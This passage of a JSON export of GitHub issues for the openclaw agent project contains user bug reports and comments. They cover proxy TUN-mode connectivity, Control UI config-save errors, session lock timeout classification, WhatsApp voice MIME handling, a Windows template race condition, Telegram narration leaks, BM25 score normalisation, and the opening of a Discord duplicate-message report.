          "updatedAt": "2026-01-28T20:57:52Z",
          "author": "MuQY1818",
          "body": "same here\n"
        },
        {
          "id": 3814002392,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3814002392",
          "createdAt": "2026-01-28T21:22:37Z",
          "updatedAt": "2026-01-28T21:22:37Z",
          "author": "MuQY1818",
          "body": "I've solved this problem and it's actually a network issue just need to turn on the tun mode in your proxy software.\n\n<img width=\"1956\" height=\"1085\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/938fe106-2bb0-4463-9086-5a4a39ad4aa4\" />"
        },
        {
          "id": 3814811641,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3814811641",
          "createdAt": "2026-01-29T01:21:17Z",
          "updatedAt": "2026-01-29T01:21:17Z",
          "author": "wzwei1990",
          "body": "> I've solved this problem and it's actually a network issue just need to turn on the tun mode in your proxy software.\n> \n> <img alt=\"Image\" width=\"1956\" height=\"1085\" src=\"https://private-user-images.githubusercontent.com/144606579/541874146-938fe106-2bb0-4463-9086-5a4a39ad4aa4.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3Njk2NDk5MDYsIm5iZiI6MTc2OTY0OTYwNiwicGF0aCI6Ii8xNDQ2MDY1NzkvNTQxODc0MTQ2LTkzOGZlMTA2LTJiYjAtNDQ2My05MDg2LTVhNGEzOWFkNGFhNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMTI5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDEyOVQwMTIwMDZaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03Mzc1NzY5MzlkNTM2OTc0MjJhZTQ1MDIzNzU4YjI2OWZlZmNiOTNiNjFlMzk0ZjZiNGI4Y2ZiM2E5NWZkM2Q4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.lqOUsRHcUBnDOWqxIYqq8M72qhtbKqfSUYXgI2bQFjQ\">\n\ni use docker  how to make it   what your proxy software?"
        },
        {
          "id": 3814905779,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3814905779",
          "createdAt": "2026-01-29T01:53:23Z",
          "updatedAt": "2026-01-29T01:59:51Z",
          "author": "Garfield-Wuu",
          "body": "Correct. I also solved my problem. It was due to the network. We need to enable the proxy."
        },
        {
          "id": 3815237357,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3815237357",
          "createdAt": "2026-01-29T03:22:44Z",
          "updatedAt": "2026-01-29T03:22:44Z",
          "author": "davidtty",
          "body": "> same here\nsolved ，turn on the tun mode in your proxy software"
        },
        {
          "id": 3816389682,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3816389682",
          "createdAt": "2026-01-29T09:05:08Z",
          "updatedAt": "2026-01-29T09:05:57Z",
          "author": "liuhantao9",
          "body": "Same issue here"
        },
        {
          "id": 3817165054,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3817165054",
          "createdAt": "2026-01-29T11:49:45Z",
          "updatedAt": "2026-01-29T11:49:45Z",
          "author": "MuQY1818",
          "body": "> > I've solved this problem and it's actually a network issue just need to turn on the tun mode in your proxy software.\n> > <img alt=\"Image\" width=\"1956\" height=\"1085\" src=\"https://private-user-images.githubusercontent.com/144606579/541874146-938fe106-2bb0-4463-9086-5a4a39ad4aa4.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3Njk2NDk5MDYsIm5iZiI6MTc2OTY0OTYwNiwicGF0aCI6Ii8xNDQ2MDY1NzkvNTQxODc0MTQ2LTkzOGZlMTA2LTJiYjAtNDQ2My05MDg2LTVhNGEzOWFkNGFhNC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMTI5JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDEyOVQwMTIwMDZaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03Mzc1NzY5MzlkNTM2OTc0MjJhZTQ1MDIzNzU4YjI2OWZlZmNiOTNiNjFlMzk0ZjZiNGI4Y2ZiM2E5NWZkM2Q4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.lqOUsRHcUBnDOWqxIYqq8M72qhtbKqfSUYXgI2bQFjQ\">\n> \n> i use docker how to make it what your proxy software?\n\nI use it on a MacBook with the software Clash Verge, and I'm not sure if it can also be used on Docker."
        },
        {
          "id": 3821957883,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3821957883",
          "createdAt": "2026-01-30T05:43:46Z",
          "updatedAt": "2026-01-30T05:44:32Z",
          "author": "xiexikang",
          "body": "<img width=\"595\" height=\"310\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b74b90cf-32d5-49f3-aab5-3bdc8c9545af\" />\n\n安装上面的服务模式，打开tun模式"
        },
        {
          "id": 3828883791,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3828883791",
          "createdAt": "2026-01-31T17:34:10Z",
          "updatedAt": "2026-01-31T17:34:10Z",
          "author": "bestcomy-code",
          "body": "> <img alt=\"Image\" width=\"595\" height=\"310\" src=\"https://private-user-images.githubusercontent.com/34528051/542616290-b74b90cf-32d5-49f3-aab5-3bdc8c9545af.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3Njk4ODA5NzUsIm5iZiI6MTc2OTg4MDY3NSwicGF0aCI6Ii8zNDUyODA1MS81NDI2MTYyOTAtYjc0YjkwY2YtMzJkNS00OWYzLWFhYjUtM2JkYzhjOTU0NWFmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAxMzElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMTMxVDE3MzExNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTg2MjdlM2Y2ZmVhOTc5ZGQ0YWUyZjc0MTAyMjgzZWFmMDI4NTJiNmE0ZTY1Zjk0YzAyM2Y5OWIwYjUxNWZmMTQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.J3TyqbE7jzy1fFWwQYSIYXIXgfzS3GP08Sx7TZ4vclQ\">\n> 安装上面的服务模式，打开tun模式\n\n你这是啥系统，我是在windows里用的wsl启的Ubuntu，怎么启用你说的服务模式\n"
        },
        {
          "id": 3845056104,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3845056104",
          "createdAt": "2026-02-04T03:35:03Z",
          "updatedAt": "2026-02-04T03:35:03Z",
          "author": "Liu0329",
          "body": "Tun模式开着，也不行哦"
        },
        {
          "id": 3845480520,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3845480520",
          "createdAt": "2026-02-04T05:42:14Z",
          "updatedAt": "2026-02-04T05:42:14Z",
          "author": "qs-lll",
          "body": "确定了 , 代理问题,  开启虚拟网卡    ,  重启电脑\n\n> Tun模式开着，也不行哦\n\n"
        },
        {
          "id": 3882754529,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3882754529",
          "createdAt": "2026-02-11T07:13:57Z",
          "updatedAt": "2026-02-11T07:13:57Z",
          "author": "xiexikang",
          "body": "> <img alt=\"Image\" width=\"595\" height=\"310\" src=\"https://private-user-images.githubusercontent.com/34528051/542616290-b74b90cf-32d5-49f3-aab5-3bdc8c9545af.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzA3OTQyNTQsIm5iZiI6MTc3MDc5Mzk1NCwicGF0aCI6Ii8zNDUyODA1MS81NDI2MTYyOTAtYjc0YjkwY2YtMzJkNS00OWYzLWFhYjUtM2JkYzhjOTU0NWFmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjExVDA3MTIzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTk2MmIzYjYxZDE2ZGRiOWFiZDk1OGYyNTBkZWJkODE1N2M1YTBhYmIwOTZjZGZlYWRjYjI1ZGIwZjJhYTJkYjgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ms0Xe9BL_LN7Q0Y_NJvAq0vnWEb8LAw2TE4EiD9zNbI\">\n> clash 安装上面的服务模式，打开tun模式\n\n\n我用另外一个软件clash verge 也可以\n<img width=\"934\" height=\"677\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5dfb159c-8e45-44c3-ac51-b94f420ad572\" />"
        }
      ]
    },
    {
      "number": 12328,
      "title": "[Bug]: Control UI 保存配置时报 invalid config（config.set INVALID_REQUEST）",
      "body": "## 现象\n\n在 Control UI 的配置页中修改配置（例如 agent 的 tool 权限）后点击保存，Gateway 返回错误：\n\n- 方法：`config.set`\n- 错误码：`INVALID_REQUEST`\n- 错误信息：`invalid config`\n\n[ws] ⇄ res ✗ config.set 24ms errorCode=INVALID_REQUEST errorMessage=invalid config conn=... id=...\n版本：20\n\n\n\n\n## 环境\n\n- OpenClaw 版本：2026.2.6-3（以实际为准）\n- 系统：macOS\n- 操作：在 Control UI 配置页修改配置后点保存\n\n## 已排除的情况\n\n1. 用同一份配置做「config.get → 原样 config.set」往返测试，可以成功，说明当前配置内容本身符合 schema，且 baseHash 使用正确。\n2. 已按文档尝试：执行 strip-meta、重启 Gateway、刷新配置页后再保存，问题仍会复现。\n3. 推断：**Control UI 在保存时发出的 payload 与 Gateway 的 config schema 不一致**（例如多出/少字段、类型不符等），导致校验失败。\n\n## 建议\n\n请帮忙确认并择一或同时处理：\n\n1. **修复 Control UI**：保证配置页在保存时序列化出的 JSON 完全符合现有 config schema（不引入未声明键、类型正确）。\n2. **或补充文档**：若某些配置（例如 agent 的 tools 权限）不推荐在 Control UI 中修改，请在文档中说明，并推荐使用直接编辑 `openclaw.json` 或 CLI（如 `openclaw config set`）的方式。\n\n## 临时绕过方式\n\n目前通过直接编辑 `~/.openclaw/openclaw.json` 修改配置，再执行 strip-meta 并重启 Gateway，可以正常生效，仅无法在 Control UI 配置页保存。",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328",
      "createdAt": "2026-02-09T04:23:55Z",
      "updatedAt": "2026-02-11T07:13:36Z",
      "author": "sucanfeng-coder",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3869745750,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328#issuecomment-3869745750",
          "createdAt": "2026-02-09T07:03:57Z",
          "updatedAt": "2026-02-09T07:05:59Z",
          "author": "itestbao-hub",
          "body": "Me too. I installed OpenCLaw today on both Ubuntu and Windows and encountered the same problem on both systems. This issue occurs after changing settings in the web configuration."
        },
        {
          "id": 3869765153,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328#issuecomment-3869765153",
          "createdAt": "2026-02-09T07:10:10Z",
          "updatedAt": "2026-02-09T07:10:10Z",
          "author": "jojo-WJ",
          "body": "me too"
        },
        {
          "id": 3870461616,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328#issuecomment-3870461616",
          "createdAt": "2026-02-09T09:27:55Z",
          "updatedAt": "2026-02-09T09:28:26Z",
          "author": "itestbao-hub",
          "body": "> me too\n\nYou will be uninstall OpenClaw and install OpenClaw 2026.2.3-1 if they not fix this bug."
        },
        {
          "id": 3871842297,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328#issuecomment-3871842297",
          "createdAt": "2026-02-09T13:50:04Z",
          "updatedAt": "2026-02-09T13:50:04Z",
          "author": "L2xd",
          "body": "me too\nUI里面配置模型的部分会报错\nres ✗ config.set 13ms errorCode=INVALID_REQUEST errorMessage=invalid config id=90db101f…8480"
        },
        {
          "id": 3879553376,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328#issuecomment-3879553376",
          "createdAt": "2026-02-10T17:18:45Z",
          "updatedAt": "2026-02-10T17:18:45Z",
          "author": "chunrichi",
          "body": "same problem in 2026.2.9\n\n<img width=\"1423\" height=\"239\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/24a45ef1-a987-4448-bae7-046d3e2bff79\" />"
        },
        {
          "id": 3882753597,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12328#issuecomment-3882753597",
          "createdAt": "2026-02-11T07:13:36Z",
          "updatedAt": "2026-02-11T07:13:36Z",
          "author": "VVIP1024",
          "body": "me too\n已更新到最新的代码，使用pnpm gateway:watch --force --verbose模式启动"
        }
      ]
    },
    {
      "number": 13925,
      "title": "Session lock timeouts are misclassified as provider failover; add lock-specific diagnostics",
      "body": "## Summary\nSession lock contention is currently surfaced as a generic timeout/failover signal. In mixed-failure situations this can be reported as `All models failed ...` together with unrelated provider cooldown/rate-limit states, which makes diagnosis noisy and can trigger unnecessary fallback attempts.\n\n## Reproduction\n### A) Session transcript lock path (`*.jsonl.lock`)\n1. Trigger two overlapping runs against the same session key so both contend on `<session>.jsonl.lock`.\n2. Keep at least one fallback provider unavailable/in cooldown.\n3. Observe aggregated error:\n   - `All models failed ... openai-codex/...: session file locked ... (timeout) | google/...: Provider google is in cooldown ...`\n\nObserved example:\n- `/tmp/openclaw/openclaw-2026-02-10.log:146`\n\n### B) Session store lock path (`sessions.json.lock`)\n1. Create concurrent writes to the same `sessions.json` store (e.g., overlapping inbound handlers / session metadata updates).\n2. Hold lock long enough to exceed 10s lock timeout.\n3. Observe error:\n   - `timeout acquiring session store lock: .../sessions.json.lock`\n\nObserved examples:\n- `/tmp/openclaw/openclaw-2026-02-11.log:10659`\n- `/tmp/openclaw/openclaw-2026-02-11.log:10800`\n\n## Actual behavior\n- Session lock timeout is interpreted as failover-worthy timeout, so model/provider fallback continues.\n- Final message can mix **local lock contention** with **provider cooldown/rate-limit** in one `All models failed` summary.\n- `sessions.json.lock` timeout message lacks owner diagnostics (pid/alive/age), making stale-vs-live lock triage harder.\n\n## Expected behavior\n- Session lock timeout should be treated as a **local lock contention class**, not provider/model failover.\n- Lock timeout errors should provide actionable diagnostics (owner pid, alive status, lock age).\n- Model fallback should stop immediately for lock-contention errors (avoid misleading cross-provider noise).\n\n## Proposed fix\n1. Add typed lock-timeout errors:\n   - `SessionFileLockTimeoutError` (`SESSION_FILE_LOCK_TIMEOUT`)\n   - `SessionStoreLockTimeoutError` (`SESSION_STORE_LOCK_TIMEOUT`)\n2. Include lock diagnostics in timeout errors:\n   - owner pid\n   - owner alive (`owner_alive=0/1`)\n   - owner age (`owner_age_ms`)\n3. In failover classification, explicitly exempt session lock timeout errors from provider failover categorization.\n\n## Why this is safe/minimal\n- No lock algorithm changes.\n- No config/migration changes.\n- Behavior change is limited to error typing + fallback classification + diagnostics.\n\n## Candidate patch (local)\nPrepared in local clone with tests:\n- `src/agents/failover-error.ts`\n- `src/agents/session-write-lock.ts`\n- `src/config/sessions/store.ts`\n- tests in corresponding `*.test.ts` files\n\nValidation run:\n```bash\npnpm vitest run src/agents/failover-error.test.ts src/agents/model-fallback.test.ts src/agents/session-write-lock.test.ts\n# 3 files passed, 36 tests passed\n```\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13925",
      "createdAt": "2026-02-11T07:13:28Z",
      "updatedAt": "2026-02-11T07:13:28Z",
      "author": "kirillsaven",
      "labels": [],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13924,
      "title": "WhatsApp voice messages broken on all model providers - audio sent as image with undefined MIME type",
      "body": "# Bug Report: WhatsApp Voice Messages Broken on All Model Providers\n\n## Summary\n\nWhatsApp voice messages fail on all model providers (Google Antigravity, OpenAI, Anthropic/OpenRouter) because OpenClaw sends audio content with incorrect MIME type formatting, treating audio as image content.\n\n## Environment\n\n- **OpenClaw Version**: 2026.2.9\n- **OS**: Ubuntu 22.04 (Linux 5.15.0-151-generic x86_64)\n- **Node**: 22.22.0\n- **WhatsApp Channel**: Baileys (web)\n\n## Steps to Reproduce\n\n1. Configure OpenClaw with WhatsApp channel\n2. Set any model provider as primary (tested: google-antigravity, openai, openrouter)\n3. Send a voice message from WhatsApp (phone or desktop)\n4. Observe error in response\n\n## Expected Behavior\n\nVoice messages should either:\n1. Be transcribed automatically before sending to models that don't support audio, OR\n2. Be sent with correct audio MIME type to models that do support audio (e.g., GPT-4o)\n\n## Actual Behavior\n\nOpenClaw sends audio content as if it were an image, with wrong/undefined MIME type:\n\n### Error Messages by Provider\n\n| Provider | Error |\n|----------|-------|\n| **Google Antigravity** | `Cloud Code Assist API error (400): Unsupported MIME type:` |\n| **OpenAI GPT-4o** | `HTTP 400: Invalid 'input[1].content[0].image_url'. Expected a base64-encoded data URL with an image MIME type (e.g. 'data:image/png;base64,...'), but got unsupported MIME type 'undefined'.` |\n| **OpenRouter/Claude** | `messages.0.content.0.image.source.base64.media_type: Input should be 'image/jpeg', 'image/gif', 'image/webp' or 'image/png'` |\n\n## Technical Details\n\n- WhatsApp voice messages arrive as `audio/ogg; codecs=opus`\n- Files are correctly downloaded to `~/.openclaw/media/inbound/*.ogg`\n- When building the API request, OpenClaw appears to:\n  1. Detect media content\n  2. Treat it as an image (wrong content type handling)\n  3. Set MIME type incorrectly or as `undefined`\n  4. Send to model API, which rejects it\n\n## Log Evidence\n\n```\nInbound message +447432727972 -> +447432727972 (direct, audio/ogg; codecs=opus, 67 chars)\n```\n\nThe audio is correctly identified on inbound, but incorrectly formatted on outbound to model API.\n\n## Suggested Fix\n\nOption A: **Auto-transcription**\n- Add config option: `channels.whatsapp.transcribeAudio: true`\n- When enabled, auto-invoke `openai-whisper-api` skill for voice messages before sending to model\n- Send transcribed text instead of audio content\n\nOption B: **Proper audio content handling**\n- Detect audio MIME types (`audio/*`)\n- For models with native audio support (GPT-4o, Gemini), send with correct audio content type\n- For models without audio support, fall back to transcription\n\n## Workaround\n\nNone currently available. Text messages work fine; only voice messages are affected.\n\n## Additional Context\n\n- The `openai-whisper-api` skill is installed and working for manual transcription\n- A `transcribe-with-retry.sh` script exists but isn't auto-invoked\n- This affects both phone and desktop WhatsApp voice messages\n- Issue started appearing after testing multiple model providers\n\n## Related\n\n- WhatsApp media download 0-byte issue (intermittent, separate bug)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13924",
      "createdAt": "2026-02-11T07:12:22Z",
      "updatedAt": "2026-02-11T07:12:22Z",
      "author": "josteins",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13920,
      "title": "[Bug]: Workspace template ENOENT race condition when multiple cron sessions scaffold simultaneously",
      "body": "## Description\n\nWhen multiple cron jobs trigger at the same time (or within seconds), their isolated sessions all attempt to read workspace template files (`AGENTS.md`, etc.) from `docs/reference/templates/`. On Windows, this can cause a transient `ENOENT` / file access failure, crashing the session instantly (9ms duration).\n\n## Steps to Reproduce\n\n1. Have multiple cron jobs scheduled close together (e.g., `0 * * * *` and `0 */6 * * *`)\n2. When they overlap (e.g., at `06:00`), multiple isolated sessions spawn simultaneously\n3. Each calls `loadTemplate('AGENTS.md')` → `resolveWorkspaceTemplateDir()` → `fs.readFile()`\n4. On Windows, the concurrent file reads occasionally fail with ENOENT despite the file existing\n\n## Error Message\n\n```\nError: Missing workspace template: AGENTS.md (C:\\Users\\...\\node_modules\\openclaw\\docs\\reference\\templates\\AGENTS.md). Ensure docs/reference/templates are packaged.\n```\n\n## Root Cause Analysis\n\nIn `src/agents/workspace.ts:loadTemplate()`, the `fs.readFile` catch block throws without distinguishing between:\n- File genuinely missing (packaging error)\n- Transient access failure (race condition, file lock, antivirus scan)\n\nThe `resolveWorkspaceTemplateDir()` in `workspace-templates.ts` has proper caching, but the subsequent `fs.readFile` in `loadTemplate` has no retry logic.\n\n## Evidence\n\nFrom our cron run history:\n- `healthcheck:security-audit` at 06:00 → instant fail (9ms) with this error\n- Same job retried ~22 min later → **success** (74 sec, all checks OK)\n- Template file confirmed present at the path both before and after the failure\n- Multiple cron jobs (backup, cleanup, security) had overlapping `runningAtMs` timestamps\n\n## Suggested Fix\n\nOption A (minimal): Add 1-2 retry with small delay in `loadTemplate()` before throwing:\n```typescript\nasync function loadTemplate(name: string): Promise<string> {\n  const templateDir = await resolveWorkspaceTemplateDir();\n  const templatePath = path.join(templateDir, name);\n  for (let attempt = 0; attempt < 3; attempt++) {\n    try {\n      const content = await fs.readFile(templatePath, 'utf-8');\n      return stripFrontMatter(content);\n    } catch {\n      if (attempt < 2) {\n        await new Promise(r => setTimeout(r, 200 * (attempt + 1)));\n        continue;\n      }\n      throw new Error(\n        'Missing workspace template: ...',\n      );\n    }\n  }\n}\n```\n\nOption B (robust): Cache template contents after first successful read (they're static).\n\n## Environment\n\n- **OS:** Windows 11 Pro (10.0.26200)\n- **OpenClaw:** 2026.2.9 (33c75cb)\n- **Node:** v24.13.0\n- **Install:** npm global (`AppData\\Roaming\\npm\\node_modules\\openclaw`)\n\n## Impact\n\nLow severity (retry self-heals), but causes unnecessary cron job failures and confusing error messages. Affects any setup with multiple concurrent cron jobs.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13920",
      "createdAt": "2026-02-11T07:06:42Z",
      "updatedAt": "2026-02-11T07:06:42Z",
      "author": "ukr-coder",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13919,
      "title": "[Bug]: Telegram - message history out of order + internal narration leaking to chat",
      "body": "## Summary\n\nTwo issues with Telegram channel integration:\n\n### 1. Message chronology is off\nMessages appear out of order in Telegram chat. Multiple messages sent in quick succession appear jumbled.\n\n### 2. Internal operational narration leaking to Telegram\nWhen the agent performs multi-step operations (browser navigation, memory searches), intermediate English narration messages are delivered to Telegram instead of only the final user-facing response.\n\nExamples of leaked messages:\n- \"Let me check the Moltbook situation from memory and try to access it.\"\n- \"Let me first check our old agent profile and look for recovery/help options.\"\n\nThese should stay internal. Only the final summary should reach the user.\n\n## Steps to reproduce\n1. Configure Telegram channel\n2. Agent performs multi-step operation with narration\n3. Each intermediate step gets sent as separate Telegram message\n4. Messages arrive out of order\n\n## Expected behavior\n- Only final user-facing replies sent to Telegram\n- Messages in correct chronological order\n\n## Actual behavior\n- Every intermediate narration step sent as separate message\n- Messages appear jumbled\n\n## Environment\n- OpenClaw: latest (npm)\n- OS: macOS arm64 Darwin 25.2.0\n- Channel: Telegram\n- Model: claude-opus-4-6",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13919",
      "createdAt": "2026-02-11T07:03:52Z",
      "updatedAt": "2026-02-11T07:04:11Z",
      "author": "JimmyClanker",
      "labels": [
        "bug",
        "r: moltbook"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882721755,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13919#issuecomment-3882721755",
          "createdAt": "2026-02-11T07:04:09Z",
          "updatedAt": "2026-02-11T07:04:09Z",
          "author": "openclaw-barnacle[bot]",
          "body": "OpenClaw is not affiliated with Moltbook, and issues related to Moltbook should not be submitted here."
        }
      ]
    },
    {
      "number": 5767,
      "title": "[Bug]: bm25RankToScore always return same value",
      "body": "### Summary\n\nbm25RankToScore incorrectly normalized SQLite FTS5 BM25 scores by clamping negative values to zero.\nBecause FTS5’s bm25() returns negative values where more negative means more relevant, all valid BM25 scores were collapsed into a constant normalized score of 1.0, effectively discarding BM25 relevance information in hybrid search.\n\n\n---\n\n### Steps to reproduce\n\n1. Use SQLite FTS5 and query with bm25() as the ranking function.\n\n\n2. Pass the raw bm25() value (which is typically negative) into bm25RankToScore.\n\n\n3. Observe the returned normalized score.\n\n\n\nExample:\n```\nbm25RankToScore(-4.2)  // => 1.0\nbm25RankToScore(-2.1)  // => 1.0\nbm25RankToScore(-0.5)  // => 1.0\n```\n\n---\n\n### Expected behavior\n\nBM25 normalization should preserve relative relevance, such that:\n\nMore negative (better) BM25 scores result in higher normalized scores\n\nLess negative (worse) BM25 scores result in lower normalized scores\n\nDifferent BM25 values produce different normalized outputs\n\n\nThis allows BM25 relevance to meaningfully contribute to hybrid (vector + keyword) ranking.\n\n\n---\n\n### Actual behavior\n\nAll negative BM25 values were clamped to 0 via Math.max(0, rank), resulting in:\n```\nnormalized = 0\nscore = 1 / (1 + 0) = 1.0\n```\nAs a result:\n\nEvery keyword match received the same textScore\n\nBM25 relevance differences were completely ignored\n\nHybrid ranking effectively treated keyword search as a boolean signal\n\n\n---\n\n### Logs or screenshots\n\nN/A\n(Behavior can be reproduced deterministically with direct calls to bm25RankToScore using negative BM25 values.)\n\n\n---\n\nFixes https://github.com/openclaw/openclaw/pull/5214\n\nby pr",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5767",
      "createdAt": "2026-01-31T23:30:24Z",
      "updatedAt": "2026-02-11T07:03:45Z",
      "author": "papago2355",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3829597481,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5767#issuecomment-3829597481",
          "createdAt": "2026-01-31T23:30:56Z",
          "updatedAt": "2026-01-31T23:30:56Z",
          "author": "papago2355",
          "body": "#5214 "
        },
        {
          "id": 3829797427,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5767#issuecomment-3829797427",
          "createdAt": "2026-02-01T00:19:20Z",
          "updatedAt": "2026-02-01T00:19:20Z",
          "author": "papago2355",
          "body": "`Math.abs()` returns positive value as positive rank.\nWhich makes\n```\n+10(not relevant) -> 10 (not relevant but has high score)\n-9(highly relevant) -> 9 (high relevant but has low score)\n```\nMy previous pr approaches may fix this issues too.\n\nTell me if I am wrong about this. And hope to fix memory issues ASAP.\nI have noticed our bots retrieve memory just by keyword matching score.\n\nFixes https://github.com/openclaw/openclaw/pull/5214"
        },
        {
          "id": 3875633284,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5767#issuecomment-3875633284",
          "createdAt": "2026-02-10T06:34:23Z",
          "updatedAt": "2026-02-10T06:34:23Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3882720075,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5767#issuecomment-3882720075",
          "createdAt": "2026-02-11T07:03:45Z",
          "updatedAt": "2026-02-11T07:03:45Z",
          "author": "papago2355",
          "body": "Already did pr in https://github.com/openclaw/openclaw/pull/5214 but still not merged."
        }
      ]
    },
    {
      "number": 13021,
      "title": "Bug: Subagent announce delivery duplicates messages in Discord (parent + child same channel)",
      "body": "# Bug: Subagent announce delivery duplicates messages in Discord (parent + child same channel)\n\n## Summary\n\nWhen a subagent (spawned via `sessions_spawn`) announces completion back to a Discord channel, the message is delivered twice with slight formatting differences. This only affects subagent announcements — direct responses from the parent agent are delivered once.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9\n- **Platform:** Docker on Unraid (Ubuntu-based host)\n- **Channel:** Discord\n- **Node.js:** v22.22.0\n- **Parent agent:** `main` (Sonnet)\n- **Subagent:** `codex` (GPT-5.3 Codex → GPT-5.2 Codex fallback)\n\n## Reproduction Steps\n\n1. Configure Discord with:\n   - Guild binding for a specific channel\n   - Parent agent (`main`) bound to that channel via `bindings` array\n   - Wildcard channel rule in `discord.guilds.<guild_id>.channels.*`\n\n2. From the parent agent in that channel, spawn a subagent:\n   ```javascript\n   sessions_spawn({\n     agentId: \"codex\",\n     task: 